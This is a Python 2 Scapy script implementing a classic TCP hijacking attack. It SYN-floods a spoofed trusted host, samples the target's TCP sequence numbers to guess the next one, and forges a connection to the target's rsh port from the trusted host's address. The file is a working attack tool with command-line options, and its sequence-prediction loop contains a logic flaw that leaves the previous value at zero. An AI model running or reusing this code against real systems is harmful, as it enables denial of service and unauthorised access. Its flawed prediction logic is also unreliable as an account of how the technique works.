import optparse
import threading
from threading import Thread
from scapy.all import *

def synFlood(src, tgt):
	for sport in range(1024,65535):
		IPlayer = IP(src=src, dst=tgt)
		TCPlayer = TCP(sport=sport, dport=513)
		pkt = IPlayer / TCPlayer
		send(pkt)

def callTSN(tgt):
	seqNum = 0
	preNum = 0
	diffSeq = 0

	for x in range(1,5):
		if preNum != 0:
			preNum = seqNum

		pkt = IP(dst=tgt)/TCP()
		ans = sr1(pkt, verbose=0)
		seqNum = ans.getlayer(TCP).seq
		diffSeq = seqNum - preNum

		print '[+]TCP Sequence Difference: ' + str(diffSeq)

	return seqNum + diffSeq

def spoofConnection(src, tgt, ack):
	IPlayer = IP(src=src,dst=tgt)
	TCPlayer = TCP(sport=513, dport=514)
	synPkt = IPlayer / TCPlayer
	send(synPkt)

	IPlayer = IP(src=src, dst=tgt)
	TCPlayer = TCP(sport=513, dport=514, ack=ack)
	ackPkt  = IPlayer / TCPlayer
	send(ackPkt)


def main():
	parser = optparse.OptionParser('Usage%prog'\
		+'-s<src for the synSpoof> -S<src for the source spoof> -t<target address>')
	parser.add_option('-s'	, dest='synSpoof', type='string', help='specify the synFlood source')
	parser.add_option('-S', dest='srcSpoof', type='string', help='specify the spoofed source')
	parser.add_option('-t', dest='tgt', type='string', help='specify the target address')

	(options, args) = parser.parse_args()

	if options.synSpoof == None or options.srcSpoof == None or options.tgt == None:
		print parser.usage 
		exit(0)
	else:
		synSpoof = options.synSpoof
		srcSpoof = options.srcSpoof
		tgt = options.tgt

	print '[+]Starting the SYN Flood attack now against the server'
	t = threading.Thread(target=synFlood, args=(synSpoof, srcSpoof))
	t.start()

	print '[+]Begining the Sequence number calculation'
	seqNum = callTSN(tgt) + 1

	print '[+]Connection being spoofed'
	spoofConnection(srcSpoof, tgt, seqNum)

	print '[+]!!!...Attack Completed...!!![+]'

if __name__ == '__main__':
	main()